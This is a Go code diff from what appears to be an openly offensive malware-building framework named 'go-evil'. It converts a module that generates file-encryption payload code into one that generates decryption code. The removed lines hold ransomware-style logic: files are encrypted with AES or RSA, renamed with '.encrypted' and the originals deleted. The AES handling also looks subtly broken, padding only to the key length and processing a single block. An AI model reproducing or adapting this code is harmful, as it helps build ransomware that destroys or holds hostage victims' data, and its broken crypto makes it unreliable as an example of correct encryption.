@@ -1,4 +1,4 @@
-package crypto
+package decrypt
 
 import (
 	"fmt"
@@ -6,13 +6,13 @@ import (
 	"github.com/TeamPhoneix/go-evil/utility/structure"
 )
 
-// Encrypts the provided target
+// Decrypts the provided target
 // The input can follow this format '${"<crypto system>", "<key>", "<'file'/'ext'/'dir'>", "<object>"}$'
-// following the above format will "overwrite" all values in the struct before encrypting
-func encrypt(value string, s_json string) ([]string, string) {
+// following the above format will "overwrite" all values in the struct before decrypting
+func Decrypt(value string, s_json string) ([]string, string) {
 	data_object := structure.Receive(s_json)
 
-	system_call := "encrypt"
+	system_call := "decrypt"
 
 	data_object.Add_go_function([]string{
 		fmt.Sprintf("func %s(){", system_call),
@@ -21,6 +21,7 @@ func encrypt(value string, s_json string) ([]string, string) {
 		"return",
 		"}",
 		"for _, target := range spine.crypt.target{",
+
 		"target = spine.variable.get(target)",
 		"gut, err := ioutil.ReadFile(target)",
 
@@ -28,7 +29,7 @@ func encrypt(value string, s_json string) ([]string, string) {
 		"spine.log(err.Error())",
 		"return",
 		"}",
-		"enc := \"\"",
+		"dec := \"\"",
 
 		"switch (spine.crypt.method){",
 
@@ -38,26 +39,36 @@ func encrypt(value string, s_json string) ([]string, string) {
 		"spine.log(err.Error())",
 		"return",
 		"}",
-		"for (len(gut) < spine.crypt.aes_key_length){",
-		"gut = append(gut, []byte(\"X\")...)",
-		"}",
-		"buffer := make([]byte, len(gut))",
-		"cipher.Encrypt(buffer, gut)",
-		"enc = hex.EncodeToString(buffer)",
-
-		"\tcase \"rsa\":",
-		"enc_byte, err := rsa.EncryptOAEP(sha256.New(), rand.Reader, &spine.crypt.rsa_public, []byte(gut), nil)",
+		"cipher_text, err := hex.DecodeString(string(gut[:]))",
 		"if err != nil{",
 		"spine.log(err.Error())",
 		"return",
 		"}",
-		"enc = hex.EncodeToString(enc_byte)",
+		"buffer := make([]byte, len(cipher_text))",
+		"cipher.Decrypt(buffer, []byte(cipher_text))",
+		"dec = string(buffer[:])",
+
+		"\tcase \"rsa\":",
+		"buffer, err := hex.DecodeString(string(gut[:]))",
+		"if err != nil{",
+		"spine.log(err.Error())",
+		"return",
+		"}",
+
+		"buffer, err = spine.crypt.rsa_private.Decrypt(nil, buffer, &rsa.OAEPOptions{Hash: crypto.SHA256})",
+		"if err != nil{",
+		"spine.log(err.Error())",
+		"return",
+		"}",
+
+		"dec = string(buffer[:])",
+
 		"}",
 		"if spine.crypt.extension == \"\"{",
-		"spine.crypt.extension = \".encrypted\"",
+		"spine.crypt.extension = \".decrypted\"",
 		"}",
-		"ioutil.WriteFile(fmt.Sprintf(\"%s%s\", target, spine.crypt.extension), []byte(enc), 0644)",
-		"os.Remove(target)",
+
+		"ioutil.WriteFile(fmt.Sprintf(\"%s%s\", target, spine.crypt.extension), []byte(dec), 0644)",
 		"}",
 
 		"}"})
@@ -66,6 +77,7 @@ func encrypt(value string, s_json string) ([]string, string) {
 	data_object.Add_go_import("fmt")
 	data_object.Add_go_import("io/ioutil")
 	data_object.Add_go_import("encoding/hex")
+	data_object.Add_go_import("crypto")
 	data_object.Add_go_import("crypto/aes")
 	data_object.Add_go_import("crypto/rsa")
 	data_object.Add_go_import("crypto/sha256")
